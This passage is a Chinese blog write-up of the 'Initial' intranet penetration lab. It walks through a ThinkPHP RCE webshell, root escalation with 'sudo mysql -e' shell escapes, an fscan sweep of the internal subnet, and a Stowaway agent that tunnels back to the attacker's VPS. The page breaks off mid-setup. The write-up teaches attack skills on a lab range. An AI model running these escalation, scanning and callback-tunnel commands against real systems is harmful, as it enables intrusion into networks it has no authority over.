@@ -1,0 +1,1199 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Suzen.jpg">
+  <link rel="icon" href="/img/Suzen.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4F4F4F">
+  <meta name="author" content="Suzen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="flag1信息收集用 Tscan 扫 Web 指纹可知是ThinkPHP服务  或者直接看 Web 页面的图标  利用工具检测到存在 ThinkPHP 漏洞  getshell直接getshell  用蚁剑连接  sudo提权成功连接上后是普通权限，需要提权  先尝试是否存在 SUID 提权的可能 1find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null   没有可以利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Initial">
+<meta property="og:url" content="https://yschen20.github.io/2025/11/14/Initial/index.html">
+<meta property="og:site_name" content="Suzen">
+<meta property="og:description" content="flag1信息收集用 Tscan 扫 Web 指纹可知是ThinkPHP服务  或者直接看 Web 页面的图标  利用工具检测到存在 ThinkPHP 漏洞  getshell直接getshell  用蚁剑连接  sudo提权成功连接上后是普通权限，需要提权  先尝试是否存在 SUID 提权的可能 1find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null   没有可以利用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113105318907.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113105407966.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113105615778.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113105654072.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113105749558.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113105916942.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113110040835.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113110538507.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113112014456.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113111148227.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113111513425.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113111606644.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113113517968.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113113140982.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113114655192.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113114617948.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113133627277.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113133858194.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113134005770.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113134307175.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113134337934.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113134409145.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113134612672.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113134640098.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113134733105.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113134902738.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113134936609.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113135041909.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113184758566.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113184848223.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113184924951.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113185004898.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113185047887.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113190140025.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113142209466.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113142429682.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113191050946.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113191200113.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113191553614.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113230904950.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113233611248.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113235605285.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251114000415936.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251114000558191.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251114001806902.png">
+<meta property="og:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251114001902330.png">
+<meta property="article:published_time" content="2025-11-13T16:27:14.000Z">
+<meta property="article:modified_time" content="2025-11-13T16:29:51.474Z">
+<meta property="article:author" content="Suzen">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://yschen20.github.io/2025/11/14/Initial/image-20251113105318907.png">
+<meta name="twitter:creator" content="@Suzen">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Initial - Suzen</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassbg.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+
+    
+
+<style type="text/css">
+  @keyframes spin3D {
+    from {
+      transform: rotate3d(0.5, 0.5, 0.5, 360deg);
+    }
+
+    to {
+      transform: rotate3d(0deg);
+    }
+  }
+
+  #loading {
+    height: 100%;
+    background-color: #172d4781;
+    backdrop-filter: saturate(100%) blur(10px);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    overflow: hidden;
+    z-index: 99999999;
+  }
+
+  .spinner-box {
+    width: 300px;
+    height: 300px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: transparent;
+  }
+
+  .leo {
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    border-radius: 50%;
+  }
+
+  .blue-orbit {
+    width: 175px;
+    height: 175px;
+    border: 2px solid #1a91fa;
+    animation: spin3D 3s linear .2s infinite;
+  }
+
+  .green-orbit {
+    width: 135px;
+    height: 135px;
+    border: 2px solid #00ffdd;
+    animation: spin3D 2s linear 0s infinite;
+  }
+
+  .red-orbit {
+    width: 100px;
+    height: 100px;
+    border: 2px solid #d75151;
+    animation: spin3D 1s linear 0s infinite;
+  }
+
+  .white-orbit-a {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 3s linear 0s infinite;
+  }
+
+  .white-orbit-b {
+    width: 70px;
+    height: 70px;
+    border: 1px solid #faf5f5;
+    animation: spin3D 1.5s linear 0s infinite;
+  }
+
+  .nucleus {
+    width: 1px;
+    height: 1px;
+    border: 1px solid #ffffff;
+    animation: spin3D 1s linear 0s infinite;
+  }
+</style>
+
+<div id="loading">
+    <div class="spinner-box">
+        <div class="blue-orbit leo"></div>
+        <div class="green-orbit leo"></div>
+        <div class="red-orbit leo"></div>
+        <div class="white-orbit-a leo"></div>
+        <div class="white-orbit-b leo"></div>
+        <div class="nucleus leo"></div>
+    </div>
+</div>
+
+<script>
+  (function () {
+    const loaded = function () {
+      window.onload = function () {
+        const loader = document.getElementById("loading");
+        loader.className = "fadeout";
+        setTimeout(function () {
+            loader.style.display = "none";
+          },
+                500
+        );
+      }
+    };
+    loaded();
+  })();
+</script>
+
+
+
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Suzen的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/2.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Initial"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Suzen
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-14 00:27" pubdate>
+          2025年11月14日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Initial</h1>
+            
+              <p id="updated-time" class="note note-info" style="display: none">
+                
+                  
+                    本文最后更新于 2025-11-14T00:29:51+08:00
+                  
+                  
+
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>用 Tscan 扫 Web 指纹可知是ThinkPHP服务</p>
+<p><img src="/2025/11/14/Initial/image-20251113105318907.png" srcset="/img/loading.gif" lazyload alt="image-20251113105318907"></p>
+<p>或者直接看 Web 页面的图标</p>
+<p><img src="/2025/11/14/Initial/image-20251113105407966.png" srcset="/img/loading.gif" lazyload alt="image-20251113105407966"></p>
+<p>利用工具检测到存在 ThinkPHP 漏洞</p>
+<p><img src="/2025/11/14/Initial/image-20251113105615778.png" srcset="/img/loading.gif" lazyload alt="image-20251113105615778"></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>直接getshell</p>
+<p><img src="/2025/11/14/Initial/image-20251113105654072.png" srcset="/img/loading.gif" lazyload alt="image-20251113105654072"></p>
+<p>用蚁剑连接</p>
+<p><img src="/2025/11/14/Initial/image-20251113105749558.png" srcset="/img/loading.gif" lazyload alt="image-20251113105749558"></p>
+<h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>成功连接上后是普通权限，需要提权</p>
+<p><img src="/2025/11/14/Initial/image-20251113105916942.png" srcset="/img/loading.gif" lazyload alt="image-20251113105916942"></p>
+<p>先尝试是否存在 SUID 提权的可能</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113110040835.png" srcset="/img/loading.gif" lazyload alt="image-20251113110040835"></p>
+<p>没有可以利用的命令，要打<code>sudo</code>提权，查找当前用户可以执行的<code>sudo</code>权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113110538507.png" srcset="/img/loading.gif" lazyload alt="image-20251113110538507"></p>
+<p>发现可以在不需要密码的情况下直接使用<code>/usr/bin/mysql</code>这个命令，而且还是个<code>root</code>权限的，可以利用这个命令暂时获得<code>root</code>权限</p>
+<p><code>mysql</code>中有个<code>-e</code>选项，允许执行 SQL 语句，要执行系统命令时在命令前面加上<code>\! </code>即可</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/mysql/">https://gtfobins.github.io/gtfobins/mysql/</a></p>
+<p><img src="/2025/11/14/Initial/image-20251113112014456.png" srcset="/img/loading.gif" lazyload alt="image-20251113112014456"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql -e <span class="hljs-string">&#x27;\! id&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113111148227.png" srcset="/img/loading.gif" lazyload alt="image-20251113111148227"></p>
+<p>此时就是<code>root</code>权限了，然后查看带flag的文件名的位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql -e <span class="hljs-string">&#x27;\! find / -type f -name &quot;*flag*&quot; 2&gt;/dev/null&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113111513425.png" srcset="/img/loading.gif" lazyload alt="image-20251113111513425"></p>
+<p>可以找到flag1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql -e <span class="hljs-string">&#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113111606644.png" srcset="/img/loading.gif" lazyload alt="image-20251113111606644"></p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;<span class="hljs-number">60b53231</span>-<br></code></pre></td></tr></table></figure>
+
+<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><h2 id="fscan信息收集"><a href="#fscan信息收集" class="headerlink" title="fscan信息收集"></a>fscan信息收集</h2><p>接下来打内网，先查看网络配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip addr<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113113517968.png" srcset="/img/loading.gif" lazyload alt="image-20251113113517968"></p>
+<p>可以发现当前的内网 IP 是<code>172.22.1.15</code>，后面的<code>scope global</code>意味着这个地址可以和外部网络通信</p>
+<p>就得到了内网网段<code>172.22.1.0/24</code></p>
+<p>上传fscan：<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/releases">https://github.com/shadow1ng/fscan/releases</a></p>
+<p><img src="/2025/11/14/Initial/image-20251113113140982.png" srcset="/img/loading.gif" lazyload alt="image-20251113113140982"></p>
+<p>授予执行权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 fscan<br></code></pre></td></tr></table></figure>
+
+<p>然后利用这个工具对内网网段<code>172.22.1.0/24</code>进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan -h 172.22.1.0/24<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113114655192.png" srcset="/img/loading.gif" lazyload alt="image-20251113114655192"></p>
+<p><img src="/2025/11/14/Initial/image-20251113114617948.png" srcset="/img/loading.gif" lazyload alt="image-20251113114617948"></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.18:3306</span> open<br><span class="hljs-number">172.22.1.21:445</span> open<br><span class="hljs-number">172.22.1.18:445</span> open<br><span class="hljs-number">172.22.1.2:445</span> open<br><span class="hljs-number">172.22.1.18:139</span> open<br><span class="hljs-number">172.22.1.21:139</span> open<br><span class="hljs-number">172.22.1.2:139</span> open<br><span class="hljs-number">172.22.1.18:135</span> open<br><span class="hljs-number">172.22.1.21:135</span> open<br><span class="hljs-number">172.22.1.2:135</span> open<br><span class="hljs-number">172.22.1.18:80</span> open<br><span class="hljs-number">172.22.1.15:80</span> open<br><span class="hljs-number">172.22.1.15:22</span> open<br><span class="hljs-number">172.22.1.2:88</span> open<br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-OA01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br>   <span class="hljs-string">[-&gt;]</span>DC01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br><span class="hljs-string">[*]</span> OsInfo <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>	(Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span>)<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">15</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">5578</span>   title:Bootstrap Material Admin<br><span class="hljs-string">[+]</span> MS17-<span class="hljs-number">010</span> <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span>	(Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span>)<br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>     XIAORANG-OA01.xiaorang.lab          Windows Server <span class="hljs-number">2012</span> R2 Datacenter <span class="hljs-number">9600</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span>     XIAORANG-WIN7.xiaorang.lab          Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>      <span class="hljs-string">[+]</span> DC:DC01.xiaorang.lab             Windows Server <span class="hljs-number">2016</span> Datacenter <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span><br>   <span class="hljs-string">[-&gt;]</span>XIAORANG-WIN7<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">21</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>        code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>?m=login<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">18</span>?m=login code:<span class="hljs-number">200</span> len:<span class="hljs-number">4012</span>   title:信呼协同办公系统<br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">1</span>.<span class="hljs-number">15</span> poc-yaml-thinkphp5023-method-rce poc1<br><br></code></pre></td></tr></table></figure>
+
+<p>可以找到四个内网主机：</p>
+<ul>
+<li><code>172.22.1.15</code>：就是当前主机，已发现ThinkPHP 5.0.23 RCE漏洞</li>
+<li><code>172.22.1.2</code>：是DC（域控制器），发现 Windows Server 2016 Datacenter<ul>
+<li>DC（Domain Controller，域控制器）是Windows网络环境中负责管理域内用户、计算机和其他网络资源的服务器，存储着域的目录数据库，提供身份验证、授权和访问控制服务</li>
+</ul>
+</li>
+<li><code>172.22.1.21</code>：是存在<code>MS17-010</code>（永恒之蓝）漏洞的Win7，可以作为横向移动的跳板</li>
+<li><code>172.22.1.18</code>：另一个Web站点，是信呼OA（信呼协同办公系统）</li>
+</ul>
+<h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>先打<code>172.22.1.18</code>信呼OA，使用 Stowaway 进行内网代理</p>
+<p>Stowaway下载地址：<a target="_blank" rel="noopener" href="https://github.com/ph4ntonn/Stowaway/releases">https://github.com/ph4ntonn/Stowaway/releases</a></p>
+<p><img src="/2025/11/14/Initial/image-20251113133627277.png" srcset="/img/loading.gif" lazyload alt="image-20251113133627277"></p>
+<p>下载这俩文件，其中<code>linux_x64_admin</code>放在自己的vps上</p>
+<p><img src="/2025/11/14/Initial/image-20251113133858194.png" srcset="/img/loading.gif" lazyload alt="image-20251113133858194"></p>
+<p><code>linux_x64_agent</code>放在目标靶机上</p>
+<p><img src="/2025/11/14/Initial/image-20251113134005770.png" srcset="/img/loading.gif" lazyload alt="image-20251113134005770"></p>
+<p>命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在admin上：</span><br>./linux_x64_admin -l &lt;端口号&gt;<br><span class="hljs-comment"># 在agent上：</span><br>./linux_x64_agent -c &lt;admin的IP&gt;:&lt;admin的端口&gt;<br></code></pre></td></tr></table></figure>
+
+<p>可能在admin机上执行命令时会出现以下权限报错</p>
+<p><img src="/2025/11/14/Initial/image-20251113134307175.png" srcset="/img/loading.gif" lazyload alt="image-20251113134307175"></p>
+<p>授予可执行权限即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x linux_x64_admin<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/14/Initial/image-20251113134337934.png" srcset="/img/loading.gif" lazyload alt="image-20251113134337934"></p>
+<p>再执行<code>./linux_x64_admin -l 9999</code></p>
+<p><img src="/2025/11/14/Initial/image-20251113134409145.png" srcset="/img/loading.gif" lazyload alt="image-20251113134409145"></p>
+<p>然后在靶机上输入命令，这里也要给权限：</p>
